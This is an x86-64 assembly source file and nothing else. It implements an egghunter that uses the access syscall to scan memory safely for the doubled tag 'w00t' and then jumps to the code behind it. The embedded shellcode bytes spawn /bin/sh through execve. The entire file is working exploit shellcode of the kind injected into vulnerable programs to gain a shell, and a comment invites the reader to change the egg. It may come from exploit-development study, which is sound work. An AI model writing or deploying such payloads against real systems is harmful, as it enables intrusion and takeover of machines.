global _start
section .text

getEgg:
        pop rsi
        mov ebx,  [rsi]
        xor rdi,rdi 
        dec rdi
        xor rsi,rsi ;mode for sys_access
        xor rdx,rdx
	add dl,8
problem:
	xor rax,rax
       	
        add rdx,0x1000 ;getconf PAGE_SIZE is 4096 so 1000h, to remove null bytes we put 10 in dh, 00 is already in dl so edx=rdx=10 00h
	
        
	 mov rdi,rdx

looping:
        inc rdi
	xor rax,rax
        mov al,21 ;sys_access
        syscall

        cmp al,0xf2
        je problem

        cmp dword [rdi-4],ebx 
        jne looping
        cmp dword [rdi-8],ebx
        jne looping
	 add rdi,4
        call rdi

_start:

        call getEgg
        egg db "w00t" ;change your 4 bytes egg here


	shellcode db 0x77,0x30,0x30,0x74,0x77,0x30,0x30,0x74,0x31,0xc0,0x48,0xbb,0xd1,0x9d,0x96,0x91,0xd0,0x8c,0x97,0xff,0x48,0xf7,0xdb,0x53,0x54,0x5f,0x99,0x52,0x57,0x54,0x5e,0xb0,0x3b,0x0f,0x05





